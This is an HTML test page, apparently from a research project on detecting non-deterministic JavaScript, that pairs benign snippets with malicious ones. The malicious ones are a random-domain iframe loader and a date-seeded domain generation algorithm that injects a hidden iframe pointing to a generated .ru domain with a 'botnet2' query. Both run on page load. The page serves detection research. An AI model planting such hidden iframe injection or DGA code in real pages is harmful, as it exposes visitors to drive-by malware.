<!DOCTYPE html>
<html>
<head>
<script  type="text/javascript" src=file://C:\Users\pc\Dropbox\UCL\projects\ongoing\js_detector\js-non-determinism-detector/scripts/logging.js></script>

<meta content="text/html;charset=utf-8" http-equiv="Content-Type">
<meta content="utf-8" http-equiv="encoding">
<title>Non-Deterministic Malicious Page</title>



<body>

<h1>This is benign</h1>...and uses random()

<p id="b_random"></p>

<script>
document.getElementById("b_random").innerHTML = Math.floor((Math.random() * 100) + 1);
</script>




<h1>This is malicious</h1> ...and uses random()
<script>
/*var a = window.navigator.userAgent, b =/ (yahoo | search | msnbot | yandex | googlebot | bing | ask) / i, c = navigator.appVersion;
if (document.cookie.indexOf("holycookie") ==- 1 &&! a.toLowerCase().match(b) && c.toLowerCase().indexOf("win") !=- 1){*/
  var d = ["myads.name", "adsnet.biz", "toolbarcom.org", "mybar.us", "freead.name"], e = [
  "axe.", "box.", "cox.", "dex.", "fax.", "fix.", "fox.", "gox.", "hex.", "kex.", "lax.", 
  "lex.", "lox.", "lux.", "max.", "mix.", "nix.", "oxo.", "oxy.", "pax.", "pix.", "pox.", 
  "pyx.", "rax.", "rex.", "sax.", "sex.", "six.", "sox.", "tax.", "tux.", "vex.", "vox.", 
  "wax.", "xis.", "zax."], f = Math.floor(Math.random() * d.length), g = Math.floor(Math.random() * e.length);
  //dt = new Date;
 // dt.setTime(dt.getTime() + 9072E4);
 // document.cookie = "holycookie=" + escape("holycookie") + ";expires=" + dt.toGMTString() + ";path=/";
 
	
//Let's not redirect...
//document.write('<script type="text/javascript" src="http://' + e[g] + d[f] + '/system/caption.js"><\/script>');

//let's create an Iframe instead...
var iframe = document.createElement('iframe');
iframe.src = 'http://' + e[g] + d[f] + '/system/caption.js';
document.body.appendChild(iframe);
//};


</script>






<h1>This is benign</h1> ...and uses Date().getHours()
<p id="b_date"></p>

<script>
var d = new Date();
document.getElementById("b_date").innerHTML = d.getHours();
</script>



<h1>This is malicious</h1> ...and uses Date()
<script>
function nextRandomNumber(){
  var hi = this .seed / this .Q;
  var lo = this .seed % this .Q;
  var test = this .A * lo - this .R * hi;
  if (test > 0){
    this .seed = test;
  }
  else {
    this .seed = test + this .M;
  }
  return (this .seed * this .oneOverM);
}
function RandomNumberGenerator(unix){
  var d = new Date(unix * 1000);
  var s = d.getHours() > 12 ? 1 : 0;
  this .seed = 2345678901 + (d.getMonth() * 0xFFFFFF) + (d.getDate() * 0xFFFF) + (Math.
  round(s * 0xFFF));
  this .A = 48271;
  this .M = 2147483647;
  this .Q = this .M / this .A;
  this .R = this .M % this .A;
  this .oneOverM = 1.0 / this .M;
  this .next = nextRandomNumber;
  return this ;
}
function createRandomNumber(r, Min, Max){
  return Math.round((Max - Min) * r.next() + Min);
}
function generatePseudoRandomString(unix, length, zone){
  var rand = new RandomNumberGenerator(unix);
  var letters = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o'
  , 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'];
  var str = '';
  for (var i = 0; i < length; i ++ ){
    str += letters[createRandomNumber(rand, 0, letters.length - 1)];
  }
  return str + '.' + zone;
}
setTimeout(function (){
  try {
    if (typeof iframeWasCreated == "undefined"){
      iframeWasCreated = true;
      var unix = Math.round( + new Date() / 1000);
      var domainName = generatePseudoRandomString(unix, 16, 'ru');
      ifrm = document.createElement("IFRAME");
      ifrm.setAttribute("src", "http://" + domainName + "/runforestrun?sid=botnet2");
      ifrm.style.width = "0px";
      ifrm.style.height = "0px";
      ifrm.style.visibility = "hidden";
      document.body.appendChild(ifrm);
    }
  }
  catch (e){
  }
}
, 500);

</script>


</body>
</html>
